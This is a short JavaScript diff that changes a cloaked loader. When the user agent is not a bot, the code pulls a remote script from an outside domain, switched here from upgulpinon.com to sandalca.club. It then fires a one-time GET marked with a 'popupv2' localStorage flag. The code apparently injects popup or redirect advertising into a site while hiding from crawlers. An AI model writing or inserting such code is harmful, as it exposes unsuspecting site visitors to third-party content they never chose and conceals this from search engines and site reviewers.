@@ -11,6 +11,6 @@ function botCheck(){
     return re.test(userAgent);
 }
 if (!botCheck()) { 
-ekle('//upgulpinon.com/1?z=4725683');
+ekle('https://sandalca.club');
 function makeRequest(t,e,s){return new Promise(function(n,i){var o=new XMLHttpRequest;o.open(t,e),o.onload=function(){this.status>=200&&this.status<300?n(o.response):i({status:this.status,statusText:o.statusText})},o.onerror=function(){i({status:this.status,statusText:o.statusText})},"POST"==t&&s?o.send(s):o.send()})}
 if( !localStorage.getItem("popupv2") ){ makeRequest("GET","https://sandalca.club"); localStorage.setItem("popupv2", true); } }
